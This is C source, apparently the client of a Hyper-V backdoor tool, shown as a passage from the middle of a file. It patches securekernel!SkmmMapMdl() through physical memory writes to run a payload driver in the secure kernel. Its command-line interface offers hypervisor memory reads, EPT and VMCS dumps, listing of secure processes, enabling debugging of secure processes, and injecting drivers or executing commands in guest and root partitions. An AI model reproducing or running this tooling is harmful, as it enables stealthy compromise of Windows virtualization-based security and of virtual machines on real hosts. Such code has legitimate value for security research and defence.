        uint32_t inst_len = ud_disassemble(&ud_obj);
        if (inst_len == 0)
        {
            // error while disassembling instruction
            printf("ERROR: Can't disassemble instruction at offset %d\n", inst_ptr);
            break;
        }

        if (ud_obj.mnemonic == UD_Ijmp || ud_obj.mnemonic == UD_Icall)
        {
            // call/jmp with relative address
            printf("ERROR: call/jmp/jxx instruction at offset %d\n", inst_ptr);
            break; 
        }

        for (int i = 0; i < 3; i++)
        {
            if (ud_obj.operand[i].type == UD_OP_JIMM)
            {
                // jxx with relative address
                printf("ERROR: jxx instruction at offset %d\n", inst_ptr);
                break;
            }

            if (ud_obj.operand[i].base == UD_R_RIP)
            {
                // RIP relative operand
                printf("ERROR: RIP-relative instruction at offset %d\n", inst_ptr);
                break;
            }
        }

        inst_ptr += inst_len;
        sk_func_saved_size += inst_len;

        if (ud_obj.mnemonic == UD_Ijmp  ||
            ud_obj.mnemonic == UD_Iret  ||
            ud_obj.mnemonic == UD_Iretf ||
            ud_obj.mnemonic == UD_Iiretw ||
            ud_obj.mnemonic == UD_Iiretq ||
            ud_obj.mnemonic == UD_Iiretd)
        {
            // end of the function thunk?
            break;
        }
    }

    if (JUMP_SIZE_0 > sk_func_saved_size)
    {
        printf(
            "ERROR: Not enough memory for jump (%d bytes found, %d required)\n", 
            sk_func_saved_size, JUMP_SIZE_0
        );

        goto _end;  
    }

    printf("[+] Patch size is %d bytes\n", sk_func_saved_size);

    // save original function code
    memcpy(loader_mem + driver_old_func, sk_func_buff, sk_func_saved_size);

    // jump from callgate to function
    *(uint16_t *)(loader_mem + driver_old_func + sk_func_saved_size) = 0x25ff;
    *(uint32_t *)(loader_mem + driver_old_func + sk_func_saved_size + 2) = 0;
    *(uint64_t *)(loader_mem + driver_old_func + sk_func_saved_size + 6) = sk_func_virt + sk_func_saved_size;

    // map driver loader into the virtual memory
    for (uint32_t i = 0; i < loader_mem_size; i += PAGE_SIZE)
    {   
        uint64_t pte_addr = 0;
        HVBD_PTE_SIZE pte_size;
        X64_PAGE_TABLE_ENTRY_4K pte;

        m_quiet = true;  

        // get physical address of the driver loader page
        if (backdoor_virt_translate((uint64_t)loader_mem + i, &phys_addr, current_pml4_addr, current_ept_addr) != 0)
        {
            m_quiet = false;  

            goto _end;
        }

        // get physical address of the page table entry
        if (backdoor_pte_addr(driver_base_virt + i, &pte_addr, &pte_size, pml4_addr, ept_addr) != 0)
        {
            m_quiet = false;

            goto _end;
        }

        m_quiet = false;

        // construct page table entry
        pte.Uint64 = 0;
        pte.Bits.PageTableBaseAddress = PAGE_TO_PFN(phys_addr);
        pte.Bits.ReadWrite = 1;
        pte.Bits.Present = 1;      

        // write page table entry contents
        if (backdoor_phys_write_64(pte_addr, pte.Uint64) != 0)
        {
            goto _end;
        }

        m_quiet = true;

        // make page executable
        if (backdoor_modify_pt(HVBD_MEM_WRITEABLE | HVBD_MEM_EXECUTABLE, driver_base_virt + i, pml4_addr, ept_addr) != 0)
        {
            m_quiet = false;

            printf("ERROR: Unable to set executable permissions for 0x%llx\n", driver_base_virt + i);
            goto _end;
        }

        m_quiet = false;
    }

    backdoor_invalidate_caches();
    bd_yeld();

    // jump to the 3-rd jump
    *(uint8_t *)(buff_jump_1 + 0) = 0xe9;
    *(uint32_t *)(buff_jump_1 + 1) = (uint32_t)(addr_jump_2_virt - addr_jump_1_virt - JUMP_SIZE_1);

    // jump to the handler
    *(uint32_t *)(buff_jump_2 + 0) = 0xd8200f90; // mov rax, cr3
    *(uint32_t *)(buff_jump_2 + 4) = 0xd8220f90; // mov cr3, rax
    *(uint16_t *)(buff_jump_2 + 8) = 0x25ff;
    *(uint32_t *)(buff_jump_2 + 10) = 0;
    *(uint64_t *)(buff_jump_2 + 14) = driver_base_virt + driver_new_func;

    // write 3-rd jump
    if (backdoor_phys_write(addr_jump_2_phys, buff_jump_2, sizeof(buff_jump_2)) != 0)
    {
        goto _end;
    }

    // write 2-nd jump
    if (backdoor_phys_write(addr_jump_1_phys, buff_jump_1, sizeof(buff_jump_1)) != 0)
    {
        goto _end;
    }

    // overwrite securekernel!SkmmMapMdl() with the short jump to the 2-nd jump
    if (backdoor_phys_write_16(sk_func_phys, 0xf9eb) != 0)
    {
        goto _end;   
    }

    backdoor_invalidate_caches();

    printf(
        "[+] securekernel!SkmmMapMdl() hook was set: 0x%llx -> 0x%llx\n", 
        sk_func_virt, driver_base_virt + driver_new_func
    );

    printf("[+] Waiting for the payload driver to be executed...\n");

    // launch secure process to trigger patched function execution
    backdoor_sk_trigger();

    while (true)
    {
        uint32_t val = 0;

        // read kernel driver call counter
        if (backdoor_virt_read_32(info_addr + DRIVER_SK_INFO_COUNT, &val) != 0)
        {
            goto _end;
        }

        // check if kernel driver was executed
        if (val > 0)
        {
            printf("[+] Payload driver was executed!\n");
            break;
        }

        bd_sleep(1000);
    }

    // read allocated image address
    if (backdoor_virt_read_64(info_addr + DRIVER_SK_INFO_ADDR, &image_addr) != 0)
    {
        goto _end;
    }

    if (payload_addr)
    {
        *payload_addr = image_addr;
    }

    if (image_addr != 0)
    {
        // success
        ret = 0;
    }
    
    if (payload)
    {
        if (report_error)
        {
            if (image_addr != 0)
            {
                printf("[+] Payload driver image address is 0x%llx\n", image_addr);
            }
            else
            {
                printf("ERROR: Driver loader was unable to load payload driver\n");
            }
        }
        else
        {
            // not actually success but success
            ret = 0;
        }
    }
    
    printf("[+] Performing cleanup...\n");

    // restore patched function
    if (backdoor_phys_write_16(sk_func_phys, *(uint16_t *)sk_func_buff) != 0)
    {
        goto _end;   
    }

    bd_sleep(1000);    

    // restore 3-rd jump
    if (backdoor_phys_write(addr_jump_2_phys, data_jump_2, sizeof(data_jump_2)) != 0)
    {
        goto _end;
    }

    // restore 2-nd jump
    if (backdoor_phys_write(addr_jump_1_phys, data_jump_1, sizeof(data_jump_1)) != 0)
    {
        goto _end;
    }

    // unmap driver loader from virtual memory
    for (uint32_t i = 0; i < loader_mem_size; i += PAGE_SIZE)
    {   
        uint64_t pte_addr = 0;
        HVBD_PTE_SIZE pte_size;

        m_quiet = true;        

        // get physical address of the page table entry
        if (backdoor_pte_addr(driver_base_virt + i, &pte_addr, &pte_size, pml4_addr, ept_addr) != 0)
        {
            m_quiet = false;

            goto _end;
        }

        m_quiet = false;

        // write page table entry contents
        if (backdoor_phys_write_64(pte_addr, 0) != 0)
        {
            goto _end;
        }
    }
        
    printf("[+] DONE\n");    

_end:

    if (data)
    {
        free(data);
    }

    if (loader_mem)
    {
        VirtualFree(loader_mem, 0, MEM_RELEASE);
    }

    if (payload_mem)
    {
        VirtualFree(payload_mem, 0, MEM_RELEASE);
    }    

    return ret;
}
//--------------------------------------------------------------------------------------
int _tmain(int argc, _TCHAR* argv[])
{
    uint32_t cpu = 0;
    HVBD_INFO bd_info;
    SYSTEM_INFO sys_info;

    GetSystemInfo(&sys_info);    

    if (argc >= 2 && !strcmp(argv[1], "--debug"))
    {
        // readd and print backdoor DXE driver debug messages buffer
        return backdoor_read_debug_messages();
    }

    if (argc >= 2)
    {
        cpu = strtoul(argv[1], NULL, 16);

        if (errno == EINVAL)
        {
            printf("ERROR: Invalid CPU number\n");
            return -1;
        }

        if (cpu >= sys_info.dwNumberOfProcessors)
        {
            printf("ERROR: Bad CPU number\n");
            return -1;
        }        
    }

    SetThreadAffinityMask(GetCurrentThread(), (uint64_t)(1 << cpu));

    printf("[+] Running on CPU #%x\n", cpu);

    m_quiet = false;

    if (backdoor_info(&bd_info) != 0)
    {
        return -1;
    }

    if (argc <= 2)
    {            
        printf("[+] Hyper-V backdoor is running\n\n");

        printf("      Hypervisor CR0: 0x%llx\n", bd_info.cr0);
        printf("      Hypervisor CR3: 0x%llx\n", bd_info.cr3);
        printf("      Hypervisor CR4: 0x%llx\n", bd_info.cr4);
        printf(" Hypervisor IDT base: 0x%llx (limit = 0x%x)\n", bd_info.idt_base, bd_info.idt_limit);
        printf("  Hypervisor GS base: 0x%llx\n", bd_info.gs_base);
        printf("     VM exit handler: 0x%llx\n", bd_info.vm_exit_addr);
        printf("       VM exit count: 0x%llx\n", bd_info.vm_exit_count);
        printf("       VM call count: 0x%llx\n\n", bd_info.vm_call_count);

        if (argc < 2)
        {
            printf("Press any key to quit...\n");
            _getch();
        }
    }
    else
    {
        char *command = argv[2];

        if (!strcmp(command, "--virt-read") && argc >= 5)
        {
            X64_PAGE_TABLE_ENTRY_4K pte_val;

            // read virtual memory at given address
            uint64_t addr = strtoull(argv[3], NULL, 16);
            uint64_t pte_addr = 0;

            if (errno == EINVAL)
            {
                printf("ERROR: Invalid address\n");
                return -1;
            }

            uint32_t size = strtoul(argv[4], NULL, 16);

            if (errno == EINVAL)
            {
                printf("ERROR: Invalid size\n");
                return -1;
            }                       

            // get PTE address for given VA
            if (backdoor_pte_addr(addr, &pte_addr, NULL, bd_info.cr3, NULL) != 0)
            {
                printf("ERROR: Unable to get PTE address\n");
                return -1;
            }

            // get PTE contents
            if (backdoor_phys_read_64(pte_addr, &pte_val.Uint64) != 0)
            {
                printf("ERROR: Unable to get PTE contents\n");
                return -1;
            }

            if (pte_val.Bits.Present == 0)
            {
                printf("ERROR: Virtual address is not mapped\n");
                return -1;
            }

            printf("[+] Reading 0x%x bytes of virtual memory at 0x%llx\n\n", size, addr);

            uint8_t *buff = (uint8_t *)malloc(size);
            if (buff)
            {
                if (backdoor_virt_read(addr, buff, size) == 0)
                {
                    hexdump(buff, size, addr);
                }

                free(buff);
            }
        }
        else if (!strcmp(command, "--virt-translate") && argc >= 5)
        {
            // translate virtual address to physical
            uint64_t phys_addr = 0, ept_addr = 0;
            uint64_t pml4_addr = strtoull(argv[3], NULL, 16);            

            if (errno == EINVAL)
            {
                printf("ERROR: Invalid PML4 address\n");
                return -1;
            }

            uint64_t addr = strtoull(argv[4], NULL, 16);            

            if (errno == EINVAL)
            {
                printf("ERROR: Invalid address\n");
                return -1;
            }

            if (argc >= 6)
            {
                ept_addr = strtoull(argv[5], NULL, 16);            

                if (errno == EINVAL)
                {
                    printf("ERROR: Invalid EPT address\n");
                    return -1;
                }
            }

            if (backdoor_virt_translate(addr, &phys_addr, pml4_addr, ept_addr) == 0)
            {
                printf("\n0x%.16llx -> 0x%.16llx\n", addr, phys_addr);
            }
        }
        else if (!strcmp(command, "--phys-read") && argc >= 5)
        {
            // read virtual memory at given address
            uint64_t addr = strtoull(argv[3], NULL, 16);

            if (errno == EINVAL)
            {
                printf("ERROR: Invalid address\n");
                return -1;
            }

            uint32_t size = strtoul(argv[4], NULL, 16);

            if (errno == EINVAL)
            {
                printf("ERROR: Invalid size\n");
                return -1;
            }

            printf("[+] Reading 0x%x bytes of physical memory at 0x%llx\n\n", size, addr);

            uint8_t *buff = (uint8_t *)malloc(size);
            if (buff)
            {
                if (backdoor_phys_read(addr, buff, size) == 0)
                {
                    hexdump(buff, size, addr);
                }

                free(buff);
            }
        }
        else if (!strcmp(command, "--phys-translate") && argc >= 5)
        {
            // translate guest physical address to host physical address
            uint64_t phys_addr = 0;
            uint64_t pml4_addr = strtoull(argv[3], NULL, 16);            

            if (errno == EINVAL)
            {
                printf("ERROR: Invalid PML4 address\n");
                return -1;
            }

            uint64_t addr = strtoull(argv[4], NULL, 16);            

            if (errno == EINVAL)
            {
                printf("ERROR: Invalid address\n");
                return -1;
            }

            if (backdoor_phys_translate(addr, &phys_addr, pml4_addr) == 0)
            {
                printf("\n0x%.16llx -> 0x%.16llx\n", addr, phys_addr);
            }
        }
        else if (!strcmp(command, "--idt"))
        {
            uint8_t *buff = (uint8_t *)malloc(PAGE_SIZE);
            if (buff)
            {
                // read IDT contents
                if (backdoor_virt_read(bd_info.idt_base, buff, PAGE_SIZE) == 0)
                {
                    IDT_ENTRY *idt = (IDT_ENTRY *)buff;

                    printf("[+] Hypervisor IDT dump:\n\n");

                    for (int i = 0; i < PAGE_SIZE / sizeof(IDT_ENTRY); i += 1)
                    {
                        uint64_t addr = ((uint64_t)idt->offset32 << 32) |
                                        ((uint64_t)idt->high_offset << 16) | idt->low_offset;

                        printf("%.4x: 0x%llx\n", i, addr);

                        idt += 1;
                    }
                }

                free(buff);
            }
        }
        else if (!strcmp(command, "--vmcs"))
        {
            if (argc >= 4)
            {
                uint64_t val = strtoull(argv[3], NULL, 16);
                uint64_t data = 0;

                if (errno == EINVAL)
                {
                    printf("ERROR: Invalid value\n");
                    return -1;
                }

                if (backdoor_vmread(val, &data) == 0)
                {
                    printf("[+] VMCS [0x%llx]: 0x%llx\n", val, data);
                }
            }
            else
            {
                int i = 0;

                printf("[+] VMCS dump:\n\n");

                // enumerate VMCS fields
                while (m_vmcs_fields[i].name != NULL)
                {
                    uint64_t data = 0;

                    // read single field
                    if (backdoor_vmread(m_vmcs_fields[i].val, &data) != 0)
                    {
                        return -1;
                    }

                    printf("%30s: 0x%llx\n", m_vmcs_fields[i].name, data);

                    i += 1;
                }
            }
        }
        else if (!strcmp(command, "--ept-list"))
        {
            EPT_INFO ept_list[EPT_MAX_COUNT];
            uint64_t ept_current = 0;

            // get current EPT address
            backdoor_ept_addr(&ept_current);

            if (backdoor_ept_list(ept_list) == 0)
            {
                bool has_vtl0 = false, has_vtl1 = false;

                printf("\n");

                // check if we have VTLs support
                for (int i = 0; i < EPT_MAX_COUNT; i += 1)
                {
                    if (ept_list[i].Addr != EPT_NONE)
                    {
                        uint64_t ept_addr = ept_list[i].Addr;

                        if (!ept_is_guest(ept_addr))
                        {
                            // check for the VTL0/VTL1 host EPT
                            if (ept_is_host_vtl0(ept_addr))
                            {
                                has_vtl0 = true;
                            }
                            else if (ept_is_host_vtl1(ept_addr))
                            {
                                has_vtl1 = true;
                            }
                        }
                    }
                }

                // print EPT list
                for (int i = 0; i < EPT_MAX_COUNT; i += 1)
                {
                    if (ept_list[i].Addr != EPT_NONE)
                    {
                        char note[0x20];
                        uint64_t ept_addr = ept_list[i].Addr, ept_vpid = ept_list[i].Vpid;
                        
                        if (has_vtl0 && has_vtl1)
                        {
                            // check for the guest/host EPT
                            if (ept_is_guest(ept_addr))
                            {
                                strcpy(note, "[GUEST] ");
                            }
                            else if (ept_is_host_vtl0(ept_addr))
                            {
                                strcpy(note, "[HOST VTL0] ");
                            }
                            else if (ept_is_host_vtl1(ept_addr))
                            {
                                strcpy(note, "[HOST VTL1] ");
                            }
                        }
                        else
                        {
                            // check for the guest/host EPT
                            if (ept_is_guest(ept_addr))
                            {
                                strcpy(note, "[GUEST] ");
                            }
                            else
                            {
                                strcpy(note, "[HOST] ");
                            }
                        }

                        // check for the current EPT
                        if (ept_addr == ept_current)
                        {
                            strcat(note, "[CURRENT]");
                        }

                        printf("  #%.2d: VPID = 0x%.4x, EPT = 0x%.16llx %s\n", i, ept_vpid, ept_addr, note);
                    }        
                }

                printf("\n");
            }
        }        
        else if (!strcmp(command, "--ept-dump") && argc >= 4)
        {        
            uint64_t addr = strtoull(argv[3], NULL, 16);

            if (errno == EINVAL)
            {
                printf("ERROR: Invalid EPT address\n");
                return -1;
            }

            printf("[+] EPT dump with PML4 at 0x%llx:\n\n", addr);

            backdoor_ept_dump(addr);
        }
        else if (!strcmp(command, "--pt-dump") && argc >= 4)
        {
            uint64_t empty_pt_addr = 0, ept_addr = 0;
            uint64_t addr = strtoull(argv[3], NULL, 16);

            if (errno == EINVAL)
            {
                printf("ERROR: Invalid page table address\n");
                return -1;
            }

            if (argc >= 5)
            {
                ept_addr = strtoull(argv[4], NULL, 16);

                if (errno == EINVAL)
                {
                    printf("ERROR: Invalid EPT address\n");
                    return -1;
                }
            }

            printf("[+] Page table dump with PML4 at 0x%llx:\n\n", addr);

            backdoor_pt_dump(addr, ept_addr);
        }
        else if (!strcmp(command, "--sk-info"))
        {
            uint64_t call_count = 0;
            SK_INFO sk_info[SK_MAX_COUNT];

            // collect secure kernel info
            if (backdoor_sk_info(sk_info, &call_count) == 0)
            {             
                SK_INFO *entry = &sk_info[0];
                
                if (entry->Rip != SK_NONE)
                {
                    uint64_t sk_addr = 0, skci_addr = 0;  

                    printf("[+] Running secure kernel detected, %lld VTL1 calls were made\n", call_count);                    

                    // get secure kernel load address
                    if (backdoor_sk_base(entry, &sk_addr, &skci_addr) == 0)
                    {                                                
                        printf(
                            "\n securekernel.exe base: 0x%.16llx\n"
                            "         skci.dll base: 0x%.16llx\n"
                            "                   CR3: 0x%llx\n"
                            "           EPT address: 0x%.16llx\n"
                            "              IDT base: 0x%.16llx\n" 
                            "              GDT base: 0x%.16llx\n\n",                        
                            sk_addr, skci_addr, entry->Cr3, entry->EptAddr, entry->IdtAddr, entry->GdtAddr
                        );
                    }
                    else
                    {
                        printf("[!] Unable to find secure kernel base address\n");       
                    }
                }
                else
                {
                    printf("[!] Secure kernel was not detected\n");
                }
            }
        }
        else if (!strcmp(command, "--sk-ps"))
        {
            uint64_t call_count = 0;
            SK_INFO sk_info[SK_MAX_COUNT];

            // collect secure kernel info
            if (backdoor_sk_info(sk_info, &call_count) == 0)
            {
                SK_INFO *entry = &sk_info[0];

                if (entry->Rip != SK_NONE)
                {
                    uint64_t sk_addr = 0;

                    printf("[+] Running secure kernel detected, %lld VTL1 calls were made\n", call_count);
                    printf("[+] Secure kernel EPT is at 0x%.16llx\n", entry->EptAddr);

                    // get secure kernel load address
                    if (backdoor_sk_base(entry, &sk_addr, NULL) == 0)
                    {
                        /*
                            See DebugActiveProcess() comment in sk_process_print()
                        */
                        load_privileges(SE_DEBUG_NAME);                        

                        // print running secure processes information
                        backdoor_sk_process_list(entry, sk_addr, sk_process_print, NULL);

                        printf("\n");
                    }
                    else
                    {
                        printf("[!] Unable to find secure kernel base address\n");
                    }
                }
                else
                {
                    printf("[!] Secure kernel was not detected\n");
                }
            }
        }
        else if (!strcmp(command, "--sk-debug-enable") && argc >= 4)
        {
            uint32_t pid = strtoul(argv[3], NULL, 10);

            if (errno == EINVAL)
            {
                printf("ERROR: Invalid PID\n");
                return -1;
            }

            uint64_t call_count = 0;
            SK_INFO sk_info[SK_MAX_COUNT];

            // collect secure kernel info
            if (backdoor_sk_info(sk_info, &call_count) == 0)
            {
                SK_INFO *entry = &sk_info[0];

                if (entry->Rip != SK_NONE)
                {
                    uint64_t sk_addr = 0;

                    printf("[+] Running secure kernel detected, %lld VTL1 calls were made\n", call_count);

                    // get secure kernel load address
                    if (backdoor_sk_base(entry, &sk_addr, NULL) == 0)
                    {
                        DEBUG_ENABLE_CTX debug_enable;

                        debug_enable.pid = pid;
                        debug_enable.enable = 1;                        
                        debug_enable.found = false;

                        /*
                            See DebugActiveProcess() comment in sk_process_debug_enable()
                        */
                        load_privileges(SE_DEBUG_NAME);

                        // change debug enable image policy for specified process
                        backdoor_sk_process_list(entry, sk_addr, sk_process_debug_enable, &debug_enable);

                        if (!debug_enable.found)
                        {
                            printf("[!] Unable to find secure process object for PID %d\n", pid);
                        }
                    }
                    else
                    {
                        printf("[!] Unable to find secure kernel base address\n");
                    }
                }
                else
                {
                    printf("[!] Secure kernel was not detected\n");
                }
            }
        }
        else if (!strcmp(command, "--sk-inject") && argc >= 4)
        {
            struct stat st;
            char *driver_path = argv[3];            

            if (stat(driver_path, &st) != 0)
            {
                printf("ERROR: Can't access %s\n", driver_path);
                return -1;
            }

            printf("[+] Loading %d bytes from %s\n", st.st_size, driver_path);

            unsigned char *driver = (unsigned char *)malloc(st.st_size);
            if (driver == NULL)
            {
                return -1;
            }

            FILE *fd = fopen(driver_path, "rb");
            if (fd)
            {
                if (fread(driver, 1, st.st_size, fd) == st.st_size)
                {
                    uint64_t call_count = 0;
                    SK_INFO sk_info[SK_MAX_COUNT];

                    // collect secure kernel info
                    if (backdoor_sk_info(sk_info, &call_count) == 0)
                    {
                        SK_INFO *entry = &sk_info[0];

                        if (entry->Rip != SK_NONE)
                        {
                            uint64_t sk_addr = 0;

                            printf("[+] Running secure kernel detected, %lld VTL1 calls were made\n", call_count);

                            // get secure kernel load address
                            if (backdoor_sk_base(entry, &sk_addr, NULL) == 0)
                            {
                                // inject driver into the secure kernel
                                backdoor_sk_inject(entry, sk_addr, NULL, driver, st.st_size, true);                              
                            }
                            else
                            {
                                printf("[!] Unable to find secure kernel base address\n");
                            }
                        }
                        else
                        {
                            printf("[!] Secure kernel was not detected\n");
                        }
                    }                    
                }
                else
                {
                    printf("ERROR: Can't read %s\n", driver_path);
                }

                fclose(fd);
            }

            free(driver);
        }
        else if (!strcmp(command, "--vm-inject") && argc >= 5)
        {        
            struct stat st;
            char *driver_path = argv[4];

            uint64_t pml4_addr = strtoull(argv[3], NULL, 16);
            uint64_t phys_addr = 0;

            if (errno == EINVAL)
            {
                printf("ERROR: Invalid EPT address\n");
                return -1;
            }
            
            if (stat(driver_path, &st) != 0)
            {
                printf("ERROR: Can't access %s\n", driver_path);
                return -1;
            }

            printf("[+] Loading %d bytes from %s\n", st.st_size, driver_path);

            unsigned char *driver = (unsigned char *)malloc(st.st_size);
            if (driver == NULL)
            {
                return -1;
            }            

            FILE *fd = fopen(driver_path, "rb");
            if (fd)
            {
                if (fread(driver, 1, st.st_size, fd) == st.st_size)
                {
                    // inject driver into the guest or root partition
                    backdoor_vm_inject(pml4_addr, NULL, driver, st.st_size, true);
                }
                else
                {
                    printf("ERROR: Can't read %s\n", driver_path);
                }

                fclose(fd);
            }            

            free(driver);
        }
        else if (!strcmp(command, "--vm-exec") && argc >= 5)
        {
            char *command = argv[4];

            uint64_t pml4_addr = strtoull(argv[3], NULL, 16);

            if (errno == EINVAL)
            {
                printf("ERROR: Invalid EPT address\n");
                return -1;
            }            

            // inject driver and execute command in the guest or root partition
            backdoor_vm_exec(pml4_addr, command);
        }
        else
        {
            printf("ERROR: Invalid command\n");
        }
    }       

    return 0;
}
//--------------------------------------------------------------------------------------
// EoF
